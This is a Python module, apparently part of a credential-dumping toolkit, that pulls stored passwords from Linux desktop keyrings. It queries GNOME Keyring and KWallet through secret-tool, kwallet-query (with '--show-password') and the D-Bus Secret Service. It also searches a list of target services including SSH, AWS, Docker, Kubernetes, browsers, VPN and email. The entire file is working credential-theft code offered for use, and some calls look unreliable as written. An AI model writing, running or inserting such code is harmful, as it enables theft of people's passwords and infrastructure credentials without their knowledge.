#!/usr/bin/env python3
"""
Desktop Keyring Dump Module
Extracts passwords from GNOME Keyring and KWallet
"""

import os
import subprocess
import json
import dbus
from typing import List, Dict, Any


class KeyringDump:
    def __init__(self, config):
        self.config = config
        
    def dump(self) -> Dict[str, Any]:
        """Main dump method"""
        results = {
            "gnome_keyring": {},
            "kwallet": {},
            "secret_tool": {},
            "available_keyrings": []
        }
        
        # Check available keyrings
        results["available_keyrings"] = self._detect_keyrings()
        
        # Try GNOME Keyring
        if "gnome" in results["available_keyrings"]:
            results["gnome_keyring"] = self._dump_gnome_keyring()
        
        # Try KWallet
        if "kwallet" in results["available_keyrings"]:
            results["kwallet"] = self._dump_kwallet()
        
        # Try secret-tool
        results["secret_tool"] = self._dump_secret_tool()
        
        return results
    
    def _detect_keyrings(self) -> List[str]:
        """Detect available keyrings on the system"""
        available = []
        
        # Check for GNOME Keyring
        try:
            result = subprocess.run(
                ['gnome-keyring-daemon', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                available.append("gnome")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Check for KWallet
        try:
            result = subprocess.run(
                ['kwallet-query', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                available.append("kwallet")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Check for secret-tool
        try:
            result = subprocess.run(
                ['secret-tool', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                available.append("secret-tool")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return available
    
    def _dump_gnome_keyring(self) -> Dict[str, Any]:
        """Dump GNOME Keyring contents"""
        results = {
            "collections": [],
            "items": [],
            "error": None
        }
        
        try:
            # Try to use secret-tool to list items
            result = subprocess.run(
                ['secret-tool', 'search', 'service', '*'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                items = self._parse_secret_tool_output(result.stdout)
                results["items"] = items
            else:
                results["error"] = f"secret-tool failed: {result.stderr}"
        
        except subprocess.TimeoutExpired:
            results["error"] = "Timeout while accessing GNOME Keyring"
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _dump_kwallet(self) -> Dict[str, Any]:
        """Dump KWallet contents"""
        results = {
            "wallets": [],
            "folders": [],
            "items": [],
            "error": None
        }
        
        try:
            # List available wallets
            result = subprocess.run(
                ['kwallet-query', '--list-wallets'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                wallets = []
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        wallets.append(line.strip())
                
                results["wallets"] = wallets
                
                # Try to access the default wallet
                if wallets:
                    default_wallet = wallets[0]  # Usually the first one is default
                    
                    # List folders in the wallet
                    folder_result = subprocess.run(
                        ['kwallet-query', '--folder', 'Passwords', '--show-password', default_wallet],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    if folder_result.returncode == 0:
                        items = self._parse_kwallet_output(folder_result.stdout)
                        results["items"] = items
                    else:
                        results["error"] = f"Failed to access wallet: {folder_result.stderr}"
            else:
                results["error"] = f"Failed to list wallets: {result.stderr}"
        
        except subprocess.TimeoutExpired:
            results["error"] = "Timeout while accessing KWallet"
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _dump_secret_tool(self) -> Dict[str, Any]:
        """Dump using secret-tool (works with both GNOME Keyring and libsecret)"""
        results = {
            "items": [],
            "error": None
        }
        
        try:
            # Search for all items
            result = subprocess.run(
                ['secret-tool', 'search', 'service', '*'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                items = self._parse_secret_tool_output(result.stdout)
                results["items"] = items
            else:
                results["error"] = f"secret-tool failed: {result.stderr}"
        
        except subprocess.TimeoutExpired:
            results["error"] = "Timeout while using secret-tool"
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _parse_secret_tool_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse secret-tool output"""
        items = []
        current_item = {}
        
        for line in output.strip().split('\n'):
            line = line.strip()
            
            if not line:
                if current_item:
                    items.append(current_item)
                    current_item = {}
                continue
            
            if line.startswith('[') and line.endswith(']'):
                # New item
                if current_item:
                    items.append(current_item)
                current_item = {"attributes": {}, "secret": None}
                continue
            
            if ' = ' in line:
                key, value = line.split(' = ', 1)
                if key == 'secret':
                    current_item["secret"] = value
                else:
                    current_item["attributes"][key] = value
        
        # Add the last item
        if current_item:
            items.append(current_item)
        
        return items
    
    def _parse_kwallet_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse KWallet output"""
        items = []
        
        for line in output.strip().split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                items.append({
                    "key": key.strip(),
                    "value": value.strip()
                })
        
        return items
    
    def _try_dbus_gnome_keyring(self) -> Dict[str, Any]:
        """Try to access GNOME Keyring via D-Bus"""
        results = {
            "collections": [],
            "items": [],
            "error": None
        }
        
        try:
            bus = dbus.SessionBus()
            
            # Try to access the Secret Service
            secret_service = bus.get_object(
                'org.freedesktop.secrets',
                '/org/freedesktop/secrets'
            )
            
            # Get collections
            collections = secret_service.GetCollections()
            
            for collection_path in collections:
                collection = bus.get_object('org.freedesktop.secrets', collection_path)
                collection_props = collection.GetProperties()
                
                collection_info = {
                    "path": str(collection_path),
                    "label": collection_props.get('org.freedesktop.Secret.Collection.Label', 'Unknown'),
                    "items": []
                }
                
                # Get items in this collection
                items = collection.GetItems()
                
                for item_path in items:
                    item = bus.get_object('org.freedesktop.secrets', item_path)
                    item_props = item.GetProperties()
                    
                    item_info = {
                        "path": str(item_path),
                        "label": item_props.get('org.freedesktop.Secret.Item.Label', 'Unknown'),
                        "attributes": item_props.get('org.freedesktop.Secret.Item.Attributes', {}),
                        "secret": None  # Would need to unlock to get the secret
                    }
                    
                    collection_info["items"].append(item_info)
                
                results["collections"].append(collection_info)
        
        except Exception as e:
            results["error"] = f"D-Bus access failed: {str(e)}"
        
        return results
    
    def _get_common_services(self) -> List[str]:
        """Get list of common services to search for"""
        return [
            "chrome", "chromium", "firefox", "brave",
            "ssh", "git", "aws", "docker", "kubernetes",
            "mysql", "postgresql", "redis", "mongodb",
            "vpn", "wifi", "network", "email", "imap", "smtp",
            "ftp", "sftp", "webdav", "dropbox", "onedrive", "google-drive"
        ]
    
    def search_specific_services(self) -> Dict[str, Any]:
        """Search for specific common services"""
        results = {}
        services = self._get_common_services()
        
        for service in services:
            try:
                result = subprocess.run(
                    ['secret-tool', 'search', 'service', service],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0 and result.stdout.strip():
                    items = self._parse_secret_tool_output(result.stdout)
                    if items:
                        results[service] = items
            
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        return results 